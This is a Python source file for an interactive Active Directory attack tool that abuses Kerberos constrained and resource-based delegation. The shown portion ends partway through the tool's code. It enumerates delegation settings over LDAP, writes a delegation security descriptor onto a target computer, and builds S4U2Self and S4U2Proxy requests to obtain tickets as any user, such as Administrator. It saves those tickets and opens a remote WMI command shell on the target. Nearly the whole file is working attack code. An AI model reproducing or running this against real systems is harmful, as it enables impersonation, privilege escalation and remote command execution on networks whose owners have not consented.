#!/usr/bin/env python3

import sys
import os
import re
import signal
import datetime
import struct
import time
import getpass
import random

from colorama import Fore, Style, init

from impacket.krb5 import constants
from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.krb5.ccache import CCache
from impacket.krb5.crypto import _HMACMD5
from impacket.krb5.asn1 import (
    AS_REP, TGS_REQ, TGS_REP, Ticket as TicketAsn1,
    AP_REQ, Authenticator,
    seq_set, seq_set_iter,
    PA_FOR_USER_ENC, PA_PAC_OPTIONS
)
from impacket.ldap import ldap, ldapasn1
from impacket.ldap import ldaptypes
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5.dcom import wmi as wmi_mod
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dtypes import NULL

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from six import ensure_binary


# ─────────────────────────────────────────────────────────────────────────────
# INIT
# ─────────────────────────────────────────────────────────────────────────────
init(autoreset=True)


# ─────────────────────────────────────────────────────────────────────────────
# SIGNAL HANDLER
# ─────────────────────────────────────────────────────────────────────────────
def _exit_handler(sig, frame):
    print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
    sys.exit(0)

signal.signal(signal.SIGINT, _exit_handler)


# ─────────────────────────────────────────────────────────────────────────────
# BANNER
# ─────────────────────────────────────────────────────────────────────────────
def banner():
    print(Fore.CYAN + """
    ╔══════════════════════════════════════════════════════════════╗
    ║                S4U2Self + S4U2Proxy Attack                   ║
    ║    Constrained Delegation & RBCD Abuse via Kerberos          ║
    ╚══════════════════════════════════════════════════════════════╝
    """ + Style.RESET_ALL)


# ─────────────────────────────────────────────────────────────────────────────
# VALIDATORS
# ─────────────────────────────────────────────────────────────────────────────
def validate_ip(ip):
    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    if not re.match(pattern, ip):
        return False
    return all(0 <= int(p) <= 255 for p in ip.split('.'))


def validate_domain(domain):
    pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
    if not re.match(pattern, domain):
        return False
    for part in domain.split('.'):
        if part.startswith('-') or part.endswith('-') or not part:
            return False
    return True


def validate_password(password):
    return len(password) >= 1


def validate_hash(hash_str):
    if ':' in hash_str:
        parts = hash_str.split(':')
        if len(parts) == 2:
            lm, nt = parts
            return len(lm) == 32 and len(nt) == 32 and all(c in '0123456789abcdefABCDEF' for c in lm + nt)
        return False
    else:
        return len(hash_str) == 32 and all(c in '0123456789abcdefABCDEF' for c in hash_str)


def validate_sid(sid_str):
    pattern = r'^S-1-5-21-\d+-\d+-\d+-\d+$'
    return bool(re.match(pattern, sid_str))


# ─────────────────────────────────────────────────────────────────────────────
# INPUT HELPER
# ─────────────────────────────────────────────────────────────────────────────
def get_input(prompt, validator=None, error_msg=None, allow_empty=False, default="", secret=False):
    while True:
        try:
            if secret:
                import re as _re
                clean_prompt = _re.sub(r'\033\[[0-9;]*m', '', prompt)
                value = getpass.getpass(clean_prompt).strip()
            else:
                value = input(prompt).strip()
            if not value and not allow_empty:
                if default:
                    return default
                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
                continue
            if not value and allow_empty:
                return default
            if validator and value and not validator(value):
                print(Fore.RED + f"[!] {error_msg}" + Style.RESET_ALL)
                continue
            return value
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)


# ─────────────────────────────────────────────────────────────────────────────
# UTILITY FUNCTIONS
# ─────────────────────────────────────────────────────────────────────────────
def get_base_dn(domain):
    return ','.join([f"DC={part}" for part in domain.split('.')])


def check_ip_reachable(ip):
    import socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((ip, 88))
        sock.close()
        if result == 0:
            return True
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((ip, 445))
        sock.close()
        return result == 0
    except Exception:
        return False


def check_credentials_and_domain(dc_ip, domain, username, password, auth_type='password', lmhash='', nthash='', ticket_file=''):
    if auth_type == 'password':
        try:
            base_dn = get_base_dn(domain)
            from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, Tls
            import ssl
            tls = Tls(validate=ssl.CERT_NONE)
            server = Server(dc_ip, port=636, use_ssl=True, tls=tls, get_info=ALL, connect_timeout=5)
            conn = Connection(
                server,
                user=f"{domain}\\{username}",
                password=password,
                authentication=NTLM,
                auto_bind=True
            )
            conn.search(
                search_base=base_dn,
                search_filter='(objectClass=domain)',
                search_scope=SUBTREE,
                attributes=['dc']
            )
            result = len(conn.entries) > 0
            conn.unbind()
            return result
        except Exception:
            try:
                base_dn = get_base_dn(domain)
                server = Server(dc_ip, get_info=ALL, connect_timeout=5)
                conn = Connection(
                    server,
                    user=f"{domain}\\{username}",
                    password=password,
                    authentication=NTLM,
                    auto_bind=True
                )
                conn.search(
                    search_base=base_dn,
                    search_filter='(objectClass=domain)',
                    search_scope=SUBTREE,
                    attributes=['dc']
                )
                result = len(conn.entries) > 0
                conn.unbind()
                return result
            except Exception:
                return False
    else:
        try:
            from impacket.dcerpc.v5 import transport, samr
            string_binding = f'ncacn_np:{dc_ip}[\\pipe\\samr]'
            tr = transport.DCERPCTransportFactory(string_binding)

            if auth_type == 'hash':
                tr.set_credentials(username, '', domain, lmhash, nthash)
            elif auth_type == 'ticket':
                tr.set_credentials(username, '', domain, '', '')
                tr.set_kerberos(True, kdcHost=dc_ip)
                if ticket_file and os.path.exists(ticket_file):
                    os.environ['KRB5CCNAME'] = ticket_file

            dce = tr.get_dce_rpc()
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)

            resp = samr.hSamrConnect(dce)
            server_hd = resp['ServerHandle']

            resp = samr.hSamrLookupDomainInSamServer(dce, server_hd, domain.split('.')[0].upper())

            samr.hSamrCloseHandle(dce, server_hd)
            dce.disconnect()
            return True
        except Exception as e:
            err = str(e).lower()
            if any(x in err for x in ['logon failure', 'access_denied', 'invalid_credentials', 'status_logon_failure', 'sec_e_logon_denied']):
                return "invalid_credentials"
            return False


# ─────────────────────────────────────────────────────────────────────────────
# LDAP ENUMERATION
# ─────────────────────────────────────────────────────────────────────────────
def ldap_enum_delegation(dc_ip, domain, username, password, nt_hash=""):
    base_dn = get_base_dn(domain)
    print(Fore.BLUE + f"[*] Connecting to LDAP {dc_ip} for delegation recon..." + Style.RESET_ALL)

    try:
        conn = ldap.LDAPConnection(f"ldap://{dc_ip}", base_dn)
        if nt_hash:
            conn.login(username, "", domain, "aad3b435b51404eeaad3b435b51404ee", nt_hash)
        else:
            conn.login(username, password, domain)
        print(Fore.GREEN + f"[+] Authenticated as {username}@{domain}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[-] LDAP failed: {e}" + Style.RESET_ALL)
        return None

    results = {"unconstrained": [], "constrained": [], "rbcd": []}

    # 1. Unconstrained Delegation
    print(Fore.BLUE + "[*] Searching unconstrained delegation (flag 0x80000)..." + Style.RESET_ALL)
    try:
        resp = conn.search(
            searchFilter=(
                "(&"
                "(|(objectClass=user)(objectClass=computer))"
                "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
                "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
                ")"
            ),
            attributes=["sAMAccountName", "objectClass", "userAccountControl"]
        )
        for item in resp:
            if not isinstance(item, ldapasn1.SearchResultEntry):
                continue
            sam = ""
            for attr in item['attributes']:
                if str(attr['type']) == "sAMAccountName":
                    sam = str(attr['vals'][0])
            if sam:
                results["unconstrained"].append(sam)
    except Exception as e:
        print(Fore.YELLOW + f"[!] Error: {e}" + Style.RESET_ALL)

    # 2. Constrained Delegation
    print(Fore.BLUE + "[*] Searching constrained delegation (msDS-AllowedToDelegateTo)..." + Style.RESET_ALL)
    try:
        resp = conn.search(
            searchFilter=(
                "(&"
                "(|(objectClass=user)(objectClass=computer))"
                "(msDS-AllowedToDelegateTo=*)"
                "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
                ")"
            ),
            attributes=["sAMAccountName", "msDS-AllowedToDelegateTo", "userAccountControl"]
        )
        for item in resp:
            if not isinstance(item, ldapasn1.SearchResultEntry):
                continue
            sam, spns, uac = "", [], 0
            for attr in item['attributes']:
                name = str(attr['type'])
                vals = [str(v) for v in attr['vals']]
                if name == "sAMAccountName":
                    sam = vals[0]
                elif name == "msDS-AllowedToDelegateTo":
                    spns = vals
                elif name == "userAccountControl":
                    uac = int(vals[0])
            if sam and spns:
                t2a4d = bool(uac & 16777216)
                results["constrained"].append({"account": sam, "spns": spns, "t2a4d": t2a4d})
    except Exception as e:
        print(Fore.YELLOW + f"[!] Error: {e}" + Style.RESET_ALL)

    # 3. RBCD
    print(Fore.BLUE + "[*] Searching RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)..." + Style.RESET_ALL)
    try:
        resp = conn.search(
            searchFilter=(
                "(&"
                "(objectClass=computer)"
                "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
                ")"
            ),
            attributes=["sAMAccountName", "msDS-AllowedToActOnBehalfOfOtherIdentity"]
        )
        for item in resp:
            if not isinstance(item, ldapasn1.SearchResultEntry):
                continue
            sam = ""
            for attr in item['attributes']:
                if str(attr['type']) == "sAMAccountName":
                    sam = str(attr['vals'][0])
            if sam:
                results["rbcd"].append(sam)
    except Exception as e:
        print(Fore.YELLOW + f"[!] Error: {e}" + Style.RESET_ALL)

    conn.close()

    # Print results
    print(Fore.GREEN + "\n" + "=" * 52 + " DELEGATION ENUMERATION RESULTS " + "=" * 4 + Style.RESET_ALL + "\n")

    print(Fore.YELLOW + "[1] UNCONSTRAINED DELEGATION (most dangerous — gets full TGT)" + Style.RESET_ALL)
    if results["unconstrained"]:
        for acc in results["unconstrained"]:
            print(Fore.RED + f"    ⚠  {acc}" + Style.RESET_ALL)
    else:
        print(Fore.GREEN + "    None found" + Style.RESET_ALL)

    print(Fore.YELLOW + "\n[2] CONSTRAINED DELEGATION (can delegate to specific SPNs only)" + Style.RESET_ALL)
    if results["constrained"]:
        for entry in results["constrained"]:
            t2a4d_flag = Fore.GREEN + "T2A4D=YES" + Style.RESET_ALL if entry['t2a4d'] else Fore.RED + "T2A4D=NO" + Style.RESET_ALL
            print(Fore.CYAN + f"    {entry['account']:<30} [{t2a4d_flag}]" + Style.RESET_ALL)
            for spn in entry['spns']:
                print(Fore.BLUE + f"      -> {spn}" + Style.RESET_ALL)
    else:
        print(Fore.GREEN + "    None found" + Style.RESET_ALL)

    print(Fore.YELLOW + "\n[3] RESOURCE-BASED CONSTRAINED DELEGATION (RBCD — set on target machine)" + Style.RESET_ALL)
    if results["rbcd"]:
        for acc in results["rbcd"]:
            print(Fore.CYAN + f"    {acc}" + Style.RESET_ALL)
    else:
        print(Fore.GREEN + "    None found" + Style.RESET_ALL)

    return results


# ─────────────────────────────────────────────────────────────────────────────
# RBCD SETUP
# ─────────────────────────────────────────────────────────────────────────────
def rbcd_setup(dc_ip, domain, username, password, target_computer, attacker_account_sid, nt_hash=""):
    print(Fore.BLUE + "\n" + "-" * 55 + Style.RESET_ALL)
    print(Fore.CYAN + "  RBCD SETUP — Writing delegation attribute" + Style.RESET_ALL)
    print(Fore.BLUE + "-" * 55 + Style.RESET_ALL)
    print(Fore.BLUE + f"  Target computer:      {target_computer}" + Style.RESET_ALL)
    print(Fore.BLUE + f"  Attacker account SID: {attacker_account_sid}" + Style.RESET_ALL)
    print(Fore.YELLOW + "\n    We're writing a Security Descriptor to:" + Style.RESET_ALL)
    print(Fore.YELLOW + f"    {target_computer}$ -> msDS-AllowedToActOnBehalfOfOtherIdentity" + Style.RESET_ALL)
    print(Fore.YELLOW + f"    This grants our account the right to use S4U2Proxy" + Style.RESET_ALL)
    print(Fore.YELLOW + f"    against {target_computer} as ANY user." + Style.RESET_ALL)

    base_dn = get_base_dn(domain)
    try:
        conn = ldap.LDAPConnection(f"ldap://{dc_ip}", base_dn)
        if nt_hash:
            conn.login(username, "", domain, "aad3b435b51404eeaad3b435b51404ee", nt_hash)
        else:
            conn.login(username, password, domain)
        print(Fore.GREEN + "[+] LDAP authenticated" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[-] LDAP failed: {e}" + Style.RESET_ALL)
        return False

    try:
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
        sd['Revision'] = b'\x01'
        sd['Sbz1'] = b'\x00'
        sd['Control'] = b'\x04\x80'
        sd['OwnerSid'] = ldaptypes.LDAP_SID()
        sd['GroupSid'] = ldaptypes.LDAP_SID()

        acl = ldaptypes.ACL()
        acl['AclRevision'] = 2
        acl['Sbz1'] = 0
        acl['Sbz2'] = 0

        ace = ldaptypes.ACCESS_ALLOWED_ACE()
        ace['Mask'] = ldaptypes.ACCESS_MASK()
        ace['Mask']['Mask'] = 0xf01ff
        ace['Flags'] = 0

        ace_sid = ldaptypes.LDAP_SID()
        ace_sid.fromCanonical(attacker_account_sid)
        ace['Sid'] = ace_sid

        acl['Data'] = ace.getData()
        sd['Dacl'] = acl

        resp = conn.search(
            searchFilter=f"(sAMAccountName={target_computer}$)",
            attributes=["distinguishedName"]
        )
        target_dn = None
        for item in resp:
            if not isinstance(item, ldapasn1.SearchResultEntry):
                continue
            for attr in item['attributes']:
                if str(attr['type']) == "distinguishedName":
                    target_dn = str(attr['vals'][0])

        if not target_dn:
            print(Fore.RED + f"[-] Computer {target_computer} not found in LDAP" + Style.RESET_ALL)
            return False

        print(Fore.BLUE + f"  Target DN: {target_dn}" + Style.RESET_ALL)

        conn.modifyObject(
            target_dn,
            {
                'msDS-AllowedToActOnBehalfOfOtherIdentity': (
                    ldap.MODIFY_REPLACE, [sd.getData()]
                )
            }
        )
        print(Fore.GREEN + "[+] RBCD attribute written successfully!" + Style.RESET_ALL)
        print(Fore.GREEN + f"[+] {target_computer} now trusts our account for delegation." + Style.RESET_ALL)
        conn.close()
        return True

    except Exception as e:
        print(Fore.RED + f"[-] Failed to write attribute: {e}" + Style.RESET_ALL)
        print(Fore.YELLOW + f"[!] Check that you have GenericWrite/WriteDacl on {target_computer}$" + Style.RESET_ALL)
        conn.close()
        return False


# ─────────────────────────────────────────────────────────────────────────────
# MANUAL S4U2Self
# ─────────────────────────────────────────────────────────────────────────────
def manual_s4u2self(username, domain, dc_ip, impersonate_user, tgt, cipher, session_key):
    print(Fore.BLUE + "\n" + "-" * 55 + Style.RESET_ALL)
    print(Fore.CYAN + "  STEP 2 — S4U2Self (Manual)" + Style.RESET_ALL)
    print(Fore.BLUE + "-" * 55 + Style.RESET_ALL)
    print(Fore.BLUE + f"  Impersonating:  {impersonate_user}" + Style.RESET_ALL)
    print(Fore.BLUE + f"  Service (us):   {username}@{domain.upper()}" + Style.RESET_ALL)
    print(Fore.YELLOW + f"\n    Building PA-FOR-USER structure..." + Style.RESET_ALL)

    try:
        decoded_tgt = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        ticket = Ticket()
        ticket.from_asn1(decoded_tgt['ticket'])

        # Build AP-REQ
        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decoded_tgt['crealm'])
        client_name = Principal()
        client_name.from_asn1(decoded_tgt, 'crealm', 'cname')
        seq_set(authenticator, 'cname', client_name.components_to_asn1)
        now = datetime.datetime.now(datetime.timezone.utc)
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        enc_auth = cipher.encrypt(session_key, 7, encoder.encode(authenticator), None)

        ap_req = AP_REQ()
        ap_req['pvno'] = 5
        ap_req['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
        ap_req['ap-options'] = constants.encodeFlags([])
        seq_set(ap_req, 'ticket', ticket.to_asn1)
        ap_req['authenticator'] = noValue
        ap_req['authenticator']['etype'] = cipher.enctype
        ap_req['authenticator']['cipher'] = enc_auth
        ap_req_encoded = encoder.encode(ap_req)

        # Build PA-FOR-USER
        client_name = Principal(impersonate_user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        s4u_data = (
            struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)
            + ensure_binary(impersonate_user)
            + ensure_binary(domain)
            + b'Kerberos'
        )
        checksum = _HMACMD5.checksum(session_key, 17, s4u_data)

        pa_for_user = PA_FOR_USER_ENC()
        seq_set(pa_for_user, 'userName', client_name.components_to_asn1)
        pa_for_user['userRealm'] = domain
        pa_for_user['cksum'] = noValue
        pa_for_user['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)
        pa_for_user['cksum']['checksum'] = checksum
        pa_for_user['auth-package'] = 'Kerberos'

        # Build TGS-REQ
        tgs_req = TGS_REQ()
        tgs_req['pvno'] = 5
        tgs_req['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgs_req['padata'] = noValue
        tgs_req['padata'][0] = noValue
        tgs_req['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgs_req['padata'][0]['padata-value'] = ap_req_encoded
        tgs_req['padata'][1] = noValue
        tgs_req['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
        tgs_req['padata'][1]['padata-value'] = encoder.encode(pa_for_user)

        req_body = seq_set(tgs_req, 'req-body')
        opts = [
            constants.KDCOptions.forwardable.value,
            constants.KDCOptions.renewable.value,
            constants.KDCOptions.canonicalize.value,
        ]
        req_body['kdc-options'] = constants.encodeFlags(opts)

        server_name = Principal(username, type=constants.PrincipalNameType.NT_UNKNOWN.value)
        seq_set(req_body, 'sname', server_name.components_to_asn1)
        req_body['realm'] = str(decoded_tgt['crealm'])
        req_body['till'] = KerberosTime.to_asn1(
            datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
        )
        req_body['nonce'] = random.getrandbits(31)
        seq_set_iter(req_body, 'etype', (
            int(cipher.enctype),
            int(constants.EncryptionTypes.rc4_hmac.value),
        ))

        print(Fore.BLUE + "[*] Sending S4U2Self request to KDC..." + Style.RESET_ALL)
        tgs_self_raw = sendReceive(encoder.encode(tgs_req), domain, dc_ip)

        print(Fore.GREEN + "[+] S4U2Self SUCCESS!" + Style.RESET_ALL)
        print(Fore.GREEN + f"  Got ticket: {impersonate_user} -> {username}" + Style.RESET_ALL)
        print(Fore.YELLOW + f"  This ticket proves '{impersonate_user} authenticated to us'" + Style.RESET_ALL)
        return tgs_self_raw

    except Exception as e:
        print(Fore.RED + f"[-] S4U2Self failed: {e}" + Style.RESET_ALL)
        print(Fore.YELLOW + "  Hint: Account may not have TrustedToAuthForDelegation set." + Style.RESET_ALL)
        print(Fore.YELLOW + "  For RBCD mode this is OK — forwardable not required." + Style.RESET_ALL)
        return None


# ─────────────────────────────────────────────────────────────────────────────
# MANUAL S4U2Proxy
# ─────────────────────────────────────────────────────────────────────────────
def manual_s4u2proxy(username, domain, dc_ip, target_spn, impersonate_user, tgs_self_raw, tgt, cipher, session_key):
    print(Fore.BLUE + "\n" + "-" * 55 + Style.RESET_ALL)
    print(Fore.CYAN + "  STEP 3 — S4U2Proxy (Manual)" + Style.RESET_ALL)
    print(Fore.BLUE + "-" * 55 + Style.RESET_ALL)
    print(Fore.BLUE + f"  Target SPN:     {target_spn}" + Style.RESET_ALL)
    print(Fore.BLUE + f"  Impersonating:  {impersonate_user}" + Style.RESET_ALL)
    print(Fore.YELLOW + f"\n    Building S4U2Proxy request..." + Style.RESET_ALL)

    try:
        decoded_tgt = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        ticket = Ticket()
        ticket.from_asn1(decoded_tgt['ticket'])

        # Build AP-REQ
        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decoded_tgt['crealm'])
        client_name = Principal()
        client_name.from_asn1(decoded_tgt, 'crealm', 'cname')
        seq_set(authenticator, 'cname', client_name.components_to_asn1)
        now = datetime.datetime.now(datetime.timezone.utc)
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        enc_auth = cipher.encrypt(session_key, 7, encoder.encode(authenticator), None)

        ap_req = AP_REQ()
        ap_req['pvno'] = 5
        ap_req['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
        ap_req['ap-options'] = constants.encodeFlags([])
        seq_set(ap_req, 'ticket', ticket.to_asn1)
        ap_req['authenticator'] = noValue
        ap_req['authenticator']['etype'] = cipher.enctype
        ap_req['authenticator']['cipher'] = enc_auth
        ap_req_encoded = encoder.encode(ap_req)

        # Decode S4U2Self ticket
        decoded_self = decoder.decode(tgs_self_raw, asn1Spec=TGS_REP())[0]
        ticket_self = Ticket()
        ticket_self.from_asn1(decoded_self['ticket'])

        # PA-PAC-OPTIONS
        pa_pac_options = PA_PAC_OPTIONS()
        pa_pac_options['flags'] = constants.encodeFlags(
            (constants.PAPacOptions.resource_based_constrained_delegation.value,)
        )

        # Build TGS-REQ
        tgs_req = TGS_REQ()
        tgs_req['pvno'] = 5
        tgs_req['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgs_req['padata'] = noValue
        tgs_req['padata'][0] = noValue
        tgs_req['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgs_req['padata'][0]['padata-value'] = ap_req_encoded
        tgs_req['padata'][1] = noValue
        tgs_req['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value)
        tgs_req['padata'][1]['padata-value'] = encoder.encode(pa_pac_options)

        req_body = seq_set(tgs_req, 'req-body')
        opts = [
            constants.KDCOptions.cname_in_addl_tkt.value,
            constants.KDCOptions.canonicalize.value,
            constants.KDCOptions.forwardable.value,
            constants.KDCOptions.renewable.value,
        ]
        req_body['kdc-options'] = constants.encodeFlags(opts)

        service_name = Principal(target_spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
        seq_set(req_body, 'sname', service_name.components_to_asn1)
        req_body['realm'] = domain
        req_body['till'] = KerberosTime.to_asn1(
            datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
        )
        req_body['nonce'] = random.getrandbits(31)
        seq_set_iter(req_body, 'etype', (
            int(constants.EncryptionTypes.rc4_hmac.value),
            int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
            int(constants.EncryptionTypes.des_cbc_md5.value),
            int(cipher.enctype),
        ))
        my_ticket = ticket_self.to_asn1(TicketAsn1())
        seq_set_iter(req_body, 'additional-tickets', (my_ticket,))

        print(Fore.BLUE + f"[*] Sending S4U2Proxy request for SPN: {target_spn}" + Style.RESET_ALL)
        tgs_proxy_raw = sendReceive(encoder.encode(tgs_req), domain, dc_ip)

        print(Fore.GREEN + "[+] S4U2Proxy SUCCESS!" + Style.RESET_ALL)
        print(Fore.GREEN + f"  Got ticket: {impersonate_user} -> {target_spn}" + Style.RESET_ALL)
        print(Fore.GREEN + "  We now hold a valid Kerberos ticket as Administrator!" + Style.RESET_ALL)
        return tgs_proxy_raw

    except Exception as e:
        print(Fore.RED + f"[-] S4U2Proxy failed: {e}" + Style.RESET_ALL)
        print(Fore.YELLOW + "  Common reasons:" + Style.RESET_ALL)
        print(Fore.YELLOW + "    - Account not trusted for delegation to this SPN" + Style.RESET_ALL)
        print(Fore.YELLOW + "    - S4U2Self ticket was not forwardable (classic CD)" + Style.RESET_ALL)
        print(Fore.YELLOW + "    - RBCD attribute not set on target computer" + Style.RESET_ALL)
        return None


# ─────────────────────────────────────────────────────────────────────────────
# GET TGT
# ─────────────────────────────────────────────────────────────────────────────
def get_tgt(username, domain, dc_ip, password="", nt_hash=""):
    print(Fore.BLUE + "\n" + "-" * 55 + Style.RESET_ALL)
    print(Fore.CYAN + f"  STEP 1 — Get TGT for service account: {username}" + Style.RESET_ALL)
    print(Fore.BLUE + "-" * 55 + Style.RESET_ALL)
    print(Fore.BLUE + f"  Sending AS-REQ to KDC {dc_ip}..." + Style.RESET_ALL)
    print(Fore.BLUE + f"  -> Pre-auth: {'NT Hash (RC4)' if nt_hash else 'Password'}" + Style.RESET_ALL)

    user_principal = Principal(
        username,
        type=constants.PrincipalNameType.NT_PRINCIPAL.value
    )

    try:
        if nt_hash:
            nt_clean = nt_hash.replace(":", "").replace(" ", "").lower()
            if len(nt_clean) != 32:
                print(Fore.RED + f"[!] NT hash must be 32 hex chars (got {len(nt_clean)})" + Style.RESET_ALL)
                sys.exit(1)
            lm = "aad3b435b51404eeaad3b435b51404ee"
            tgt, cipher, old_sk, sk = getKerberosTGT(
                clientName=user_principal,
                password="",
                domain=domain,
                lmhash=bytes.fromhex(lm),
                nthash=bytes.fromhex(nt_clean),
                aesKey="",
                kdcHost=dc_ip
            )
        else:
            tgt, cipher, old_sk, sk = getKerberosTGT(
                clientName=user_principal,
                password=password,
                domain=domain,
                lmhash=b"",
                nthash=b"",
                aesKey="",
                kdcHost=dc_ip
            )

        print(Fore.GREEN + "[+] TGT received!" + Style.RESET_ALL)
        print(Fore.GREEN + f"  KDC confirmed identity of {username}@{domain.upper()}" + Style.RESET_ALL)
        print(Fore.YELLOW + "  TGT is our 'service identity token' for S4U requests" + Style.RESET_ALL)
        return tgt, cipher, old_sk, sk

    except Exception as e:
        print(Fore.RED + f"[-] TGT failed: {e}" + Style.RESET_ALL)
        sys.exit(1)


# ─────────────────────────────────────────────────────────────────────────────
# SAVE TICKET
# ─────────────────────────────────────────────────────────────────────────────
def save_ticket(tgs, domain, target_spn, impersonate_user):
    print(Fore.BLUE + "\n" + "-" * 55 + Style.RESET_ALL)
    print(Fore.CYAN + "  STEP 4 — Save ticket to .ccache" + Style.RESET_ALL)
    print(Fore.BLUE + "-" * 55 + Style.RESET_ALL)

    ccache = CCache()
    ccache.fromTGS(tgs, f"{impersonate_user}@{domain.upper()}", target_spn)

    filename = f"s4u_{impersonate_user}_{target_spn.replace('/', '_')}.ccache"
    ccache.saveFile(filename)

    spn_parts = target_spn.split('/')
    target_host = spn_parts[1] if len(spn_parts) >= 2 else target_spn

    print(Fore.GREEN + f"[+] Ticket saved -> {filename}" + Style.RESET_ALL)
    print(Fore.CYAN + "\n  Use the ticket:" + Style.RESET_ALL)
    print(Fore.WHITE + f"  export KRB5CCNAME={filename}" + Style.RESET_ALL)
    return filename


# ─────────────────────────────────────────────────────────────────────────────
# WMI SHELL
# ─────────────────────────────────────────────────────────────────────────────
def _launch_wmi_shell_with_ccache(args, ccache_path):
    abs_ccache = os.path.abspath(ccache_path)
    os.environ["KRB5CCNAME"] = abs_ccache
    print(Fore.GREEN + f"\n[+] KRB5CCNAME -> {abs_ccache}" + Style.RESET_ALL)

    spn_parts = args.target_spn.split('/')
    target_host = spn_parts[1] if len(spn_parts) >= 2 else args.dc
    out_file = f"__s4u_{os.getpid()}"
    out_unc = "\\\\127.0.0.1\\C$\\{}".format(out_file)

    try:
        print(Fore.BLUE + f"[*] Connecting SMB -> {target_host}..." + Style.RESET_ALL)
        smb = SMBConnection(target_host, args.dc, sess_port=445, timeout=30)
        smb.kerberosLogin(
            user=args.impersonate, password="", domain=args.domain,
            lmhash="", nthash="", aesKey="",
            kdcHost=args.dc, useCache=True
        )
        print(Fore.GREEN + f"[+] SMB OK — authenticated as {args.impersonate}@{args.domain}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[-] SMB failed: {e}" + Style.RESET_ALL)
        return

    try:
        print(Fore.BLUE + f"[*] Connecting WMI -> {target_host}..." + Style.RESET_ALL)
        dcom = DCOMConnection(
            target_host,
            username=args.impersonate, password="",
            domain=args.domain,
            lmhash="aad3b435b51404eeaad3b435b51404ee",
            nthash="",
            aesKey="",
            oxidResolver=True,
            doKerberos=True,
            kdcHost=args.dc
        )
        iface = dcom.CoCreateInstanceEx(wmi_mod.CLSID_WbemLevel1Login, wmi_mod.IID_IWbemLevel1Login)
        iWbemLogin = wmi_mod.IWbemLevel1Login(iface)
        iWbemServices = iWbemLogin.NTLMLogin("//./root/cimv2", NULL, NULL)
        iWbemLogin.RemRelease()
        win32Process, _ = iWbemServices.GetObject("Win32_Process")
    except Exception as e:
        print(Fore.RED + f"[-] WMI connection failed: {e}" + Style.RESET_ALL)
        try: dcom.disconnect()
        except: pass
        try: smb.logoff()
        except: pass
        return

    print(Fore.GREEN + "\n[+] WMI Shell ready!" + Style.RESET_ALL)
    print(Fore.GREEN + f"    Connected: {args.domain}\\{args.impersonate}@{target_host}" + Style.RESET_ALL)
    print(Fore.YELLOW + "    Type 'exit' to quit. Ctrl+C cancels current command." + Style.RESET_ALL + "\n")

    cwd = "C:\\"
    _running = [True]

    def _sigint(sig, frame):
        _running[0] = False
        print(Fore.YELLOW + "\n[*] Ctrl+C — exiting shell..." + Style.RESET_ALL, flush=True)

    old_handler = signal.signal(signal.SIGINT, _sigint)

    def _cleanup():
        signal.signal(signal.SIGINT, old_handler)
        _devnull = open(os.devnull, "w")
        _old_err, sys.stderr = sys.stderr, _devnull
        try:
            dcom.disconnect()
        except:
            pass
        try:
            smb.logoff()
        except:
            pass
        sys.stderr = _old_err
        _devnull.close()
        print(Fore.GREEN + "[+] WMI session closed." + Style.RESET_ALL + "\n")

    while _running[0]:
        try:
            cmd_in = input(
                f"  {Fore.YELLOW}[WMI] {args.domain}\\{args.impersonate}:{cwd}> {Style.RESET_ALL}"
            ).strip()
        except EOFError:
            break
        except KeyboardInterrupt:
            _running[0] = False
            print(Fore.YELLOW + "\n[*] Ctrl+C — exiting shell..." + Style.RESET_ALL)
            break

        if not cmd_in:
            continue
